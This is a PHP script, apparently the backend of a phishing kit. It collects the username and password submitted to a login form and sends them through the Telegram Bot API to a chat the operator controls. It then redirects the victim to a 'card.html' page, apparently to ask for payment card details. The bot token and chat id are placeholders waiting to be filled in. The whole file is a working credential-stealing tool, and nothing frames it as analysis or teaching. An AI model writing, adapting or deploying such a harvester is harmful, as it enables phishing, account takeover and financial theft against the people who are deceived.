<?php
$telegram_bot_token = 'TELEGRAM BOT TOKEN HERE';
$telegram_chat_id = 'CHAT ID HERE (ADD THE BOT TO THE GROUP FIRST)';

$username = $_POST['Username'];
$password = $_POST['Password'];
$message = "$username|$password";
file_get_contents("https://api.telegram.org/bot$telegram_bot_token/sendMessage?chat_id=$telegram_chat_id&text=" . urlencode($message));
header('Location: card.html');
?>
